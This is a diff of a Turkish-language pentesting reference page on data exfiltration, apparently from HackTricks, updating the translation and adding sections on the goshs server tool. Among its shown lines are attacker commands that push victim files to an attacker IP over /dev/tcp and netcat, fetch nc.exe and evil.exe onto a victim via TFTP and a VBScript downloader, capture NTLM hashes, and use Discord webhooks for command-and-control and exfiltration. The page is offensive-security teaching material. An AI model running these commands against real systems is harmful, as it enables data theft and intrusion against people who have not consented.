@@ -1,17 +1,17 @@
-# Veri Dışa Aktarımı
+# Exfiltration
 
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Ele geçirilen dosyaları `C:\Users\Public` konumunda sahneleyip Rclone ile meşru yedeklemeleri taklit edecek şekilde dışarı aktarmaya dair uçtan uca bir örnek için aşağıdaki iş akışını inceleyin.
+> `C:\Users\Public` içinde loot hazırlayıp bunu meşru yedeklemeleri taklit etmek için Rclone ile exfiltrate etmeye uçtan uca bir örnek için aşağıdaki iş akışını inceleyin.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Bilgi dışarı aktarmak için sıkça beyaz listeye alınan alan adları
+## Information exfiltrate etmek için yaygın olarak whitelist edilmiş domainler
 
-Kötüye kullanılabilecek sıkça beyaz listeye alınan alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin
+Kötüye kullanılabilecek yaygın olarak whitelist edilmiş domainleri bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin
 
 ## Copy\&Paste Base64
 
@@ -52,7 +52,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Dosya yükleme
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**GET ve POST’ları yazdıran SimpleHttpServer (header’lar dahil)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Python modülü [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -107,13 +107,46 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs), `python3 -m http.server` için tek ikili dosyalı bir alternatiftir
+ve upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+ile OOB collaboration özellikleri (DNS, SMTP, NTLM hash capture) sunar.
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks, JSON ve isteğe bağlı dosya parçalarını kabul eden yalnızca yazma amaçlı HTTPS uç noktalarıdır. Genellikle güvenilen SaaS alan adlarına izin verilir ve OAuth/API anahtarına gerek duymazlar; bu da onları düşük engelli beaconing ve exfiltration için kullanışlı kılar.
+Webhooks, JSON ve isteğe bağlı dosya parçalarını kabul eden yazma-only HTTPS endpoint’leridir. Genellikle trusted SaaS domain’lerine izin verilir ve OAuth/API key gerektirmezler; bu da onları düşük sürtünmeli beaconing ve exfiltration için kullanışlı kılar.
 
 Key ideas:
 - Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data; payload_json adlı bir part içinde {"content":"..."} bulunur ve isteğe bağlı olarak file adlı dosya parçası(lar) eklenir.
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
 - Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
@@ -185,8 +218,8 @@ Start-Sleep -Seconds 20
 }
 ```
 Notlar:
-- Benzer desenler, incoming webhooks kullanan diğer işbirliği platformları (Slack/Teams) için de geçerlidir; URL ve JSON schema'yı buna göre ayarlayın.
-- Discord Desktop önbellek artefaktlarının DFIR'ı ve webhook/API kurtarımı için, bakınız:
+- Benzer kalıplar, incoming webhooks kullanan diğer collaboration platformları (Slack/Teams) için de geçerlidir; URL ve JSON schema’yı buna göre uyarlayın.
+- Discord Desktop cache artifacts ve webhook/API recovery için DFIR konusunda şuna bakın:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -194,12 +227,12 @@ Notlar:
 
 ## FTP
 
-### FTP sunucusu (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP sunucusu (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -235,14 +268,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali sunucu olarak
+Kali server olarak
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Veya **samba kullanarak** bir smb paylaşımı oluşturun:
+Ya da **samba** kullanarak bir smb share oluşturun:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,15 +298,24 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) SMB üzerinden dosya sunan ve bağlanan istemcilerden NetNTLMv2 hash’lerini yakalayan tek-binary bir alternatiftir:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-Saldırganın SSHd'yi çalıştırıyor olması gerekir.
+Saldırganın SSHd çalışıyor durumda olması gerekir.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Eğer victim'de SSH varsa, attacker victim'den attacker'a bir dizin mount edebilir.
+Eğer kurbanda SSH varsa, saldırgan kurbandan saldırgana bir dizini mount edebilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -286,19 +328,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### victim'den dosya indir
+### Dosyayı victim’dan indir
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Hedefe dosya yükle
+### Dosyayı victim'a yükle
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-teşekkürler **@BinaryShadow\_**
+**@BinaryShadow\_** sayesinde
 
 ## **ICMP**
 ```bash
@@ -320,33 +362,46 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Eğer bir SMTP sunucusuna veri gönderebiliyorsanız, veriyi almak için python ile bir SMTP oluşturabilirsiniz:
+Bir SMTP sunucusuna veri gönderebiliyorsanız, python ile veriyi almak için bir SMTP oluşturabilirsiniz:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) OOB exfiltration senaryoları sırasında email callback’lerini yakalamak için hızlı bir SMTP server başlatabilir:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+Alınan e-postalar ve callback’ler doğrudan terminal çıktısında görüntülenir.
+Tam OOB kapsamı için DNS callback sunucusu ile birleştirilebilir:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-Varsayılan olarak XP ve 2003'te (diğerlerinde yükleme sırasında açıkça eklenmelidir)
+Varsayılan olarak XP ve 2003’te (diğerlerinde kurulum sırasında açıkça eklenmesi gerekir)
 
-Kali'de, **start TFTP server**:
+Kali’de, **TFTP server** başlatın:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**python'da TFTP sunucusu:**
+**Python ile TFTP server:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**victim** üzerinde, Kali sunucusuna bağlan:
+**victim** üzerinde Kali sunucusuna bağlanın:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP oneliner ile bir dosya indir:
+Bir PHP oneliner ile bir dosya indirin:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -354,7 +409,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**Kurban**
+**Mağdur**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -388,21 +443,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda onları **hex'ten yeniden oluşturma yeteneğine** sahiptir. Bu, bir ikili dosyanın hex'ini sağlayarak `debug.exe`'nin ikili dosyayı oluşturabileceği anlamına gelir. Ancak, debug.exe'nin **en fazla 64 kb boyutundaki dosyaları assemble etme sınırlamasına** sahip olduğunu not etmek önemlidir.
+`debug.exe` programı yalnızca binary’leri incelemeye izin vermekle kalmaz, aynı zamanda onları **hex’ten yeniden oluşturma** yeteneğine de sahiptir. Bu, bir binary’nin hex’ini sağlayarak `debug.exe` ile binary dosyanın oluşturulabileceği anlamına gelir. Ancak, `debug.exe`’nin **64 kb boyutuna kadar olan dosyaları assemble etme** sınırlamasına sahip olduğunu belirtmek önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Sonra metni windows-shell'e yapıştırın; nc.exe adlı bir dosya oluşturulacaktır.
+Ardından metni windows-shell içine kopyala-yapıştır ve nc.exe adlı bir dosya oluşturulacaktır.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## Referanslar
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
